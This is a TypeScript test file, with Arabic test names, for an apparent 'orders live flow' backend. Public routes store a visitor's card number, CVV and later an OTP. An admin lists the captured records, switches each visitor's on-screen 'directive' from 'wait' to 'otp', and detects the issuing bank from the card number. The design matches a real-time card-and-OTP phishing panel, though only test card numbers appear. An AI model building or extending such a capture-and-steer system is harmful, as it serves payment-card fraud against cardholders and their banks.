import { describe, expect, it } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

/* سياق عام بدون مستخدم (المسارات عامة) */
function createPublicContext(): TrpcContext {
  return {
    user: null,
    req: { protocol: "https", headers: {} } as TrpcContext["req"],
    res: { clearCookie: () => {} } as unknown as TrpcContext["res"],
  };
}

describe("orders live flow", () => {
  const caller = appRouter.createCaller(createPublicContext());
  const publicId = "TEST-" + Math.random().toString(36).slice(2, 8);

  it("ينشئ ويحدّث طلباً حياً ثم يجلبه", async () => {
    const up = await caller.orders.upsert({
      publicId,
      name: "زائر تجريبي",
      phone: "0500000000",
      page: "بيانات البطاقة",
      cardNumber: "4111 1111 1111 1111",
      cvv: "123",
    });
    expect(up.success).toBe(true);

    const got = await caller.orders.get({ publicId });
    expect(got).not.toBeNull();
    expect(got?.name).toBe("زائر تجريبي");
    expect(got?.cardNumber).toBe("4111 1111 1111 1111");
    expect(got?.directive).toBe("wait");
  });

  it("يضيف OTP بتحديث ثانٍ دون فقدان البيانات السابقة", async () => {
    await caller.orders.upsert({ publicId, page: "رمز OTP", otp: "9988" });
    const got = await caller.orders.get({ publicId });
    expect(got?.otp).toBe("9988");
    // البيانات السابقة محفوظة
    expect(got?.cardNumber).toBe("4111 1111 1111 1111");
  });

  it("يظهر الطلب في قائمة المشرف", async () => {
    const { orders } = await caller.orders.list();
    expect(orders.some((o) => o.publicId === publicId)).toBe(true);
  });

  it("المشرف يوجّه الزائر فيتحدّث directive", async () => {
    await caller.orders.direct({ publicId, directive: "otp" });
    const got = await caller.orders.get({ publicId });
    expect(got?.directive).toBe("otp");
  });

  it("المشرف يحذف الطلب", async () => {
    await caller.orders.remove({ publicId });
    const got = await caller.orders.get({ publicId });
    expect(got).toBeNull();
  });

  it("يحفظ اسم البنك المُصدِر (bankName) ويُسترجعه في قائمة المشرف", async () => {
    const bankPublicId = "BANK-" + Math.random().toString(36).slice(2, 8);
    await caller.orders.upsert({
      publicId: bankPublicId,
      name: "زائر بنك",
      page: "بيانات البطاقة",
      cardNumber: "4893 5100 0000 0000",
      bankName: "بنك أبوظبي الأول (FAB)",
    });
    const got = await caller.orders.get({ publicId: bankPublicId });
    expect(got?.bankName).toBe("بنك أبوظبي الأول (FAB)");
    const { orders } = await caller.orders.list();
    const row = orders.find((o) => o.publicId === bankPublicId);
    expect(row?.bankName).toBe("بنك أبوظبي الأول (FAB)");
    await caller.orders.remove({ publicId: bankPublicId });
  });

  it("إجراء detectBank يكشف البنك من القاعدة المحلية", async () => {
    const r = await caller.orders.detectBank({ cardNumber: "4893510000000000" });
    expect(r.bankName).toContain("أبوظبي الأول");
  });
});
